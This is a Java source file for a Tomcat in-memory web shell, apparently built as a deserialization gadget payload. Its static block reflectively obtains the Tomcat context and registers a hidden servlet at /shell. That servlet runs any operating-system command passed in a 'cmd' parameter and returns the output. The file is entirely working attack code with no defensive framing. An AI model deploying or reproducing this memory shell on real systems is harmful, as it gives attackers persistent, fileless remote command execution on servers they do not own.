package demo.memshell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.Wrapper;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.servlet.*;
import java.io.IOException;
import java.lang.reflect.Field;

import static java.lang.System.out;

public class TomcatServletMemShell extends AbstractTranslet implements Servlet {

    static{
        try {
            //获取目标环境中的standardContext对象，该获取方法只可用在Tomcat 8,9版本
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            Field webappclassLoaderBaseField= null;
            webappclassLoaderBaseField = Class.forName("org.apache.catalina.loader.WebappClassLoaderBase").getDeclaredField("resources");
            webappclassLoaderBaseField.setAccessible(true);
            WebResourceRoot resources=(WebResourceRoot) webappclassLoaderBaseField.get(webappClassLoaderBase);
            Context standardContext =  resources.getContext();

            //内存马实现过程
            Servlet servlet = new TomcatServletMemShell();
            String name = "evil";
            Wrapper newWrapper = standardContext.createWrapper();
            newWrapper.setName(name);
            newWrapper.setServlet(servlet);
            newWrapper.setServletClass(servlet.getClass().getName());
            standardContext.addChild(newWrapper);
            standardContext.addServletMappingDecoded("/shell", name);

        } catch (NoSuchFieldException e) {
            out.println(e);
        } catch (ClassNotFoundException e) {
            out.println(e);
        } catch (IllegalAccessException e) {
            out.println(e);
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
    @Override
    public void init(ServletConfig config) throws ServletException {
        out.println("injection");
    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
        String cmd = req.getParameter("cmd");
        if(cmd != null){
            try {
                Process process = Runtime.getRuntime().exec(cmd);
                java.io.InputStream inputStream = process.getInputStream();
                java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(inputStream));
                StringBuilder result = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    result.append(line).append("\n");
                }
                res.getWriter().write(result.toString());
                process.waitFor();
            } catch (Exception e) {
                res.getWriter().write("Error: " + e.getMessage());
            }
        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {
    }
}
